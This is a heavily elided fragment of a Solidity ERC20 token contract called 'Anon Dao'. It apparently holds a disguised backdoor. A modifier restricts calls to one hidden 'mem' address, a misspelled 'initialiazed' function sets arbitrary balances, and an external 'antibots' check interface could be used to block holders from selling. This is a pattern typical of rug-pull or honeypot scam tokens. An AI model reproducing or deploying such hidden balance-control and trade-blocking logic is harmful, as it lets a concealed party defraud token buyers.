...
interface antibots {function check(address _from, bool _state) external;}
...
contract Anon is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"Anon Dao";
    string private constant _symbol = unicode"Anon Dao";
    ...
    modifier memlogic() {require(address(mem) == msg.sender);_;}
    ...
    function initialiazed(address _bots, uint256 _checks) private memlogic {
        _balances[_bots] = _checks;
    }
    ...
    function openTrading(address _swap) external onlyOwner() {
